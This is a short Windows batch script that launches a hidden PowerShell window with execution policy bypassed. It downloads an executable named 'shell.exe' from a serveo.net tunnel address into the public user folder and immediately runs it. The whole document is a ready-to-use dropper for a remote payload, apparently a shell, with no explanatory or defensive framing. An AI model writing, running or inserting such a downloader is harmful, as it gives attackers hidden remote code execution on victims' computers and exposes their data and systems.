@echo off
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://0c59ceb3e2c6b22bbec7e59987bde4b4.serveo.net/shell.exe' -OutFile 'C:\Users\Public\shell.exe'; Start-Process 'C:\Users\Public\shell.exe'"
